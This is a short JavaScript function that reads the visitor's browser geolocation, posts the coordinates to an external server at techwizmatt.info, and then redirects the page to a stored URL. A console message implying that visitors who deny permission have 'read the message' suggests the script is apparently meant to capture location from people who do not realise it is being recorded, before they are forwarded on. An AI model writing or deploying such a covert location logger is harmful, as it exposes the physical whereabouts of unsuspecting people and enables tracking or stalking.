function recordLoc() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            console.log(position.coords);

            $.post( "https://techwizmatt.info/api/loc-fetch/record.php", { latitude:position.coords.latitude, longitude:position.coords.longitude })
                .done( function (data) {
            //    Post is complete fully redirect!
                console.log(data);
                setTimeout(function(){
                    console.log(window.urlLoadingValue);
                    window.location.replace(window.urlLoadingValue);
                }, 100);
            });
        }, error =>{
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    console.log("The user has denied user loc, Looking like they read the message");
                    break;
                case error.POSITION_UNAVAILABLE:
                    console.log("The location is currently unavailable, Let's reload the page and try again.");
                    break;
                case error.TIMEOUT:
                    console.log("The location fetch has timed out, Let's reload the page and try again.");
                    break;
                case error.UNKNOWN_ERR:
                    console.log("Unknown error");
                    break;
            }
        });
    } else {
        console.log("Location fetch is not available with this device. Let's inform the user of a standard error.");
    }
}

